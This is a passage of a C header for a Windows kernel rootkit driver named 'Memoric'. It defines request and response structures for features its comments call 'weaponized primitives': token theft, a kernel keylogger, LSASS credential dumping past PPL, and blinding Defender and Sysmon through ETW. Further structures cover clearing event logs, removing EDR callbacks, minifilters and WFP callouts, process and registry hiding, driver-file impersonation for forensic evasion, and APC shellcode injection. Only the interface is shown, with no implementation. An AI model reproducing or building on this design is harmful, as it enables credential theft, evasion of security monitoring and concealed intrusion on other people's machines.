} MEMORIC_TOKEN_STEAL_REQUEST, *PMEMORIC_TOKEN_STEAL_REQUEST;

typedef struct _MEMORIC_TOKEN_STEAL_RESPONSE {
    ULONG   Success;
    ULONG   TargetPid;
    ULONG64 OldToken;           /* Previous token value */
    ULONG64 NewToken;           /* New token value */
    ULONG64 EprocessAddr;
} MEMORIC_TOKEN_STEAL_RESPONSE, *PMEMORIC_TOKEN_STEAL_RESPONSE;

/* ================================================================
 * Process Protect — Set/strip PS_PROTECTION on process.
 * Can give PPL (Protected Process Light) status to our process
 * or strip it from anti-cheat processes.
 * ================================================================ */

#define MEMORIC_PROTECT_SET        0   /* Set protection on process */
#define MEMORIC_PROTECT_STRIP      1   /* Strip protection from process */
#define MEMORIC_PROTECT_QUERY      2   /* Query protection level */

typedef struct _MEMORIC_PROCESS_PROTECT_REQUEST {
    ULONG   Action;
    ULONG   ProcessId;
    UCHAR   SignerType;         /* PS_PROTECTED_SIGNER: 0=None, 1=Authenticode, ...6=WinTcb */
    UCHAR   SignerAudit;
    UCHAR   SignerLevel;        /* PS_PROTECTED_TYPE: 0=None, 1=Light, 2=Full */
    UCHAR   Reserved[5];
} MEMORIC_PROCESS_PROTECT_REQUEST, *PMEMORIC_PROCESS_PROTECT_REQUEST;

typedef struct _MEMORIC_PROCESS_PROTECT_RESPONSE {
    ULONG   Success;
    ULONG   ProcessId;
    ULONG64 EprocessAddr;
    UCHAR   OldProtection;
    UCHAR   NewProtection;
    UCHAR   OldSignerType;
    UCHAR   OldSignerAudit;
    UCHAR   Reserved[4];
} MEMORIC_PROCESS_PROTECT_RESPONSE, *PMEMORIC_PROCESS_PROTECT_RESPONSE;

/* ================================================================
 * Phase 13: Advanced Weaponized Primitives
 * ================================================================ */

/* ================================================================
 * Keylogger — Kernel-mode keylogger using gafAsyncKeyState.
 * Captures keystrokes without any API hooks.
 * ================================================================ */

#define MEMORIC_KEYLOG_START       0
#define MEMORIC_KEYLOG_STOP        1
#define MEMORIC_KEYLOG_READ        2
#define MEMORIC_KEYLOG_QUERY       3

typedef struct _MEMORIC_KEYLOGGER_REQUEST {
    ULONG   Action;
    ULONG   MaxKeys;
} MEMORIC_KEYLOGGER_REQUEST, *PMEMORIC_KEYLOGGER_REQUEST;

typedef struct _MEMORIC_KEYLOGGER_RESPONSE {
    ULONG   Success;
    ULONG   KeyCount;
    ULONG   Active;
    ULONG   Reserved;
    USHORT  Keys[512];          /* Captured virtual key codes */
} MEMORIC_KEYLOGGER_RESPONSE, *PMEMORIC_KEYLOGGER_RESPONSE;

/* ================================================================
 * Registry Hide — Hide registry keys/values from user-mode queries.
 * Uses CmRegisterCallbackEx to intercept RegEnumKey/RegEnumValue.
 * ================================================================ */

#define MEMORIC_REG_HIDE_ADD       0
#define MEMORIC_REG_HIDE_REMOVE    1
#define MEMORIC_REG_HIDE_LIST      2
#define MEMORIC_REG_HIDE_CLEAR     3

typedef struct _MEMORIC_REG_HIDE_REQUEST {
    ULONG   Action;
    ULONG   HideType;           /* 0=key, 1=value */
    WCHAR   KeyPath[256];
    WCHAR   ValueName[128];
} MEMORIC_REG_HIDE_REQUEST, *PMEMORIC_REG_HIDE_REQUEST;

typedef struct _MEMORIC_REG_HIDE_RESPONSE {
    ULONG   Success;
    ULONG   HiddenCount;
    ULONG   TotalHidden;
    ULONG   Reserved;
} MEMORIC_REG_HIDE_RESPONSE, *PMEMORIC_REG_HIDE_RESPONSE;

/* ================================================================
 * File Lock — Protect files from deletion/modification/reading.
 * Hooks IRP_MJ_CREATE via minifilter to block unauthorized access.
 * ================================================================ */

#define MEMORIC_FILE_LOCK_ADD      0
#define MEMORIC_FILE_LOCK_REMOVE   1
#define MEMORIC_FILE_LOCK_LIST     2
#define MEMORIC_FILE_LOCK_CLEAR    3

typedef struct _MEMORIC_FILE_LOCK_REQUEST {
    ULONG   Action;
    ULONG   ProtectFlags;       /* bit0=anti-delete, bit1=anti-write, bit2=anti-read */
    WCHAR   FilePath[260];
    ULONG   AllowedPid;         /* PID exempt from protection */
    ULONG   Reserved;
} MEMORIC_FILE_LOCK_REQUEST, *PMEMORIC_FILE_LOCK_REQUEST;

typedef struct _MEMORIC_FILE_LOCK_RESPONSE {
    ULONG   Success;
    ULONG   LockedCount;
    ULONG   TotalLocked;
    ULONG   Reserved;
} MEMORIC_FILE_LOCK_RESPONSE, *PMEMORIC_FILE_LOCK_RESPONSE;

/* ================================================================
 * ETW Blind — Disable/enable ETW providers by zeroing enable info.
 * Blinds Threat Intelligence, Defender, Sysmon, etc.
 * ================================================================ */

#define MEMORIC_ETW_BLIND_DISABLE  0
#define MEMORIC_ETW_BLIND_ENABLE   1
#define MEMORIC_ETW_BLIND_QUERY    2
#define MEMORIC_ETW_BLIND_KILL_ALL 3

typedef struct _MEMORIC_ETW_BLIND_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    UCHAR   ProviderGuid[16];   /* GUID in raw bytes */
} MEMORIC_ETW_BLIND_REQUEST, *PMEMORIC_ETW_BLIND_REQUEST;

typedef struct _MEMORIC_ETW_BLIND_RESPONSE {
    ULONG   Success;
    ULONG   ProvidersAffected;
    ULONG64 ProviderAddr;
    ULONG64 OldEnableInfo;
} MEMORIC_ETW_BLIND_RESPONSE, *PMEMORIC_ETW_BLIND_RESPONSE;

/* ================================================================
 * EPROCESS Spoof — Modify EPROCESS fields to disguise a process.
 * Spoof ImageFileName, CommandLine, InheritedFromUniqueProcessId.
 * ================================================================ */

#define MEMORIC_SPOOF_IMAGE_NAME   0
#define MEMORIC_SPOOF_COMMAND_LINE 1
#define MEMORIC_SPOOF_QUERY        2
#define MEMORIC_SPOOF_PID          3

typedef struct _MEMORIC_EPROCESS_SPOOF_REQUEST {
    ULONG   Action;
    ULONG   ProcessId;
    UCHAR   NewImageName[16];   /* EPROCESS.ImageFileName is 15+1 bytes */
    WCHAR   NewCommandLine[260];
    ULONG   NewParentPid;
    ULONG   Reserved;
} MEMORIC_EPROCESS_SPOOF_REQUEST, *PMEMORIC_EPROCESS_SPOOF_REQUEST;

typedef struct _MEMORIC_EPROCESS_SPOOF_RESPONSE {
    ULONG   Success;
    ULONG   ProcessId;
    ULONG64 EprocessAddr;
    UCHAR   OldImageName[16];
    ULONG   OldParentPid;
    ULONG   Reserved;
} MEMORIC_EPROCESS_SPOOF_RESPONSE, *PMEMORIC_EPROCESS_SPOOF_RESPONSE;

/* ================================================================
 * Event Log Clear — Tamper with Windows event logs from kernel.
 * Kill EventLog service threads / delete .evtx files.
 * ================================================================ */

#define MEMORIC_EVTLOG_CLEAR_ALL       0
#define MEMORIC_EVTLOG_CLEAR_SECURITY  1
#define MEMORIC_EVTLOG_CLEAR_SYSTEM    2
#define MEMORIC_EVTLOG_CLEAR_SYSMON    3
#define MEMORIC_EVTLOG_KILL_SERVICE    4

typedef struct _MEMORIC_EVENT_LOG_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    WCHAR   LogName[64];
} MEMORIC_EVENT_LOG_REQUEST, *PMEMORIC_EVENT_LOG_REQUEST;

typedef struct _MEMORIC_EVENT_LOG_RESPONSE {
    ULONG   Success;
    ULONG   ThreadsKilled;
    ULONG   FilesDeleted;
    ULONG   Reserved;
    ULONG64 SvchostPid;
} MEMORIC_EVENT_LOG_RESPONSE, *PMEMORIC_EVENT_LOG_RESPONSE;

/* ================================================================
 * Credential Dump — Read process memory from kernel mode.
 * Bypass PPL protection to read LSASS or any protected process.
 * ================================================================ */

#define MEMORIC_CRED_READ_MEMORY   0
#define MEMORIC_CRED_FIND_LSASS    1
#define MEMORIC_CRED_DUMP_FULL     2

typedef struct _MEMORIC_CRED_DUMP_REQUEST {
    ULONG   Action;
    ULONG   ProcessId;
    ULONG64 Address;
    ULONG   Size;
    ULONG   Reserved;
} MEMORIC_CRED_DUMP_REQUEST, *PMEMORIC_CRED_DUMP_REQUEST;

typedef struct _MEMORIC_CRED_DUMP_RESPONSE {
    ULONG   Success;
    ULONG   ProcessId;
    ULONG64 EprocessAddr;
    ULONG   BytesRead;
    ULONG   Reserved;
    /* Data follows immediately after this struct */
} MEMORIC_CRED_DUMP_RESPONSE, *PMEMORIC_CRED_DUMP_RESPONSE;

/* ================================================================
 * Driver Impersonate — Swap driver file on disk with a legitimate
 * Microsoft-signed driver to evade forensic analysis.
 * ================================================================ */

#define MEMORIC_IMPERSONATE_SWAP       0
#define MEMORIC_IMPERSONATE_RESTORE    1
#define MEMORIC_IMPERSONATE_QUERY      2

typedef struct _MEMORIC_DRIVER_IMPERSONATE_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    WCHAR   TargetPath[260];    /* Our driver file path */
    WCHAR   LegitPath[260];     /* Legitimate MS driver to copy from */
} MEMORIC_DRIVER_IMPERSONATE_REQUEST, *PMEMORIC_DRIVER_IMPERSONATE_REQUEST;

typedef struct _MEMORIC_DRIVER_IMPERSONATE_RESPONSE {
    ULONG   Success;
    ULONG   Reserved;
    ULONG64 BytesWritten;
    ULONG64 NtStatus;
} MEMORIC_DRIVER_IMPERSONATE_RESPONSE, *PMEMORIC_DRIVER_IMPERSONATE_RESPONSE;

/* ================================================================
 * Callback Nuke — Forcefully remove Process/Thread/Image/Object
 * notification callbacks that EDR/AV registers.
 * ================================================================ */

#define MEMORIC_CBNUKE_ENUM        0    /* List all callbacks */
#define MEMORIC_CBNUKE_REMOVE      1    /* Remove specific callback by index */
#define MEMORIC_CBNUKE_NUKE_ALL    2    /* Remove ALL non-OS callbacks */
#define MEMORIC_CBNUKE_RESTORE     3    /* Restore previously removed callback */

#define MEMORIC_CB_TYPE_PROCESS    0
#define MEMORIC_CB_TYPE_THREAD     1
#define MEMORIC_CB_TYPE_IMAGE      2
#define MEMORIC_CB_TYPE_OBJECT     3
#define MEMORIC_CB_TYPE_REGISTRY   4

typedef struct _MEMORIC_CALLBACK_NUKE_REQUEST {
    ULONG   Action;
    ULONG   CallbackType;       /* MEMORIC_CB_TYPE_* */
    ULONG   Index;              /* Callback array index (for remove) */
    ULONG   Reserved;
} MEMORIC_CALLBACK_NUKE_REQUEST, *PMEMORIC_CALLBACK_NUKE_REQUEST;

typedef struct _MEMORIC_CALLBACK_NUKE_RESPONSE {
    ULONG   Success;
    ULONG   TotalCallbacks;
    ULONG   RemovedCount;
    ULONG   Reserved;
    struct {
        ULONG64 Address;        /* Callback function address */
        ULONG64 ModuleBase;     /* Owner module base */
        CHAR    ModuleName[64]; /* Owner module name */
        ULONG   Type;           /* CB_TYPE_* */
        ULONG   Active;         /* Is it currently active */
    } Entries[64];
} MEMORIC_CALLBACK_NUKE_RESPONSE, *PMEMORIC_CALLBACK_NUKE_RESPONSE;

/* ================================================================
 * Minifilter Detach — Forcefully detach filesystem minifilter
 * drivers (used by AV/EDR for file scanning).
 * ================================================================ */

#define MEMORIC_MINIFILTER_ENUM    0    /* List all minifilter instances */
#define MEMORIC_MINIFILTER_DETACH  1    /* Detach specific minifilter */
#define MEMORIC_MINIFILTER_NUKE    2    /* Detach ALL non-OS minifilters */

typedef struct _MEMORIC_MINIFILTER_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    WCHAR   FilterName[64];     /* Filter name (for detach) */
    ULONG   FrameId;            /* Frame ID (0 for default) */
    ULONG   Reserved2;
} MEMORIC_MINIFILTER_REQUEST, *PMEMORIC_MINIFILTER_REQUEST;

typedef struct _MEMORIC_MINIFILTER_DETACH_RESPONSE {
    ULONG   Success;
    ULONG   TotalFilters;
    ULONG   DetachedCount;
    ULONG   Reserved;
    struct {
        WCHAR   FilterName[64];
        ULONG   FrameId;
        ULONG   NumInstances;
        ULONG64 FilterAddr;
    } Entries[32];
} MEMORIC_MINIFILTER_DETACH_RESPONSE, *PMEMORIC_MINIFILTER_DETACH_RESPONSE;

/* ================================================================
 * Kernel APC Inject — Queue user-mode APC from kernel (stealth)
 * Uses KeInsertQueueApc for undetectable code execution.
 * ================================================================ */

#define MEMORIC_KAPC_INJECT        0    /* Queue shellcode APC */
#define MEMORIC_KAPC_DLL           1    /* Queue DLL load APC */

typedef struct _MEMORIC_KERNEL_APC_REQUEST {
    ULONG   Action;
    ULONG   ProcessId;
    ULONG   ThreadId;           /* Target thread (0=first alertable) */
    ULONG   ShellcodeSize;
    ULONG64 ShellcodeAddr;      /* Address in target process (pre-allocated) */
    WCHAR   DllPath[260];       /* For DLL injection mode */
} MEMORIC_KERNEL_APC_REQUEST, *PMEMORIC_KERNEL_APC_REQUEST;

typedef struct _MEMORIC_KERNEL_APC_RESPONSE {
    ULONG   Success;
    ULONG   ThreadId;           /* Thread that received the APC */
    ULONG64 ApcAddr;            /* Address of queued APC object */
    ULONG64 NtStatus;
} MEMORIC_KERNEL_APC_RESPONSE, *PMEMORIC_KERNEL_APC_RESPONSE;

/* ================================================================
 * WFP (Windows Filtering Platform) Remove — Remove WFP callouts
 * to blind network monitoring/firewall rules.
 * ================================================================ */

#define MEMORIC_WFP_ENUM           0    /* List all WFP callouts */
#define MEMORIC_WFP_REMOVE         1    /* Remove specific callout */
#define MEMORIC_WFP_NUKE           2    /* Remove ALL non-OS callouts */

typedef struct _MEMORIC_WFP_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    ULONG64 CalloutId;          /* Callout ID to remove */
    WCHAR   ProviderName[64];   /* Filter by provider (optional) */
} MEMORIC_WFP_REQUEST, *PMEMORIC_WFP_REQUEST;

typedef struct _MEMORIC_WFP_RESPONSE {
    ULONG   Success;
    ULONG   TotalCallouts;
    ULONG   RemovedCount;
    ULONG   Reserved;
    struct {
        ULONG64 CalloutId;
        ULONG64 FunctionAddr;
        WCHAR   ProviderName[64];
        ULONG   LayerId;
        ULONG   Active;
    } Entries[32];
} MEMORIC_WFP_RESPONSE, *PMEMORIC_WFP_RESPONSE;
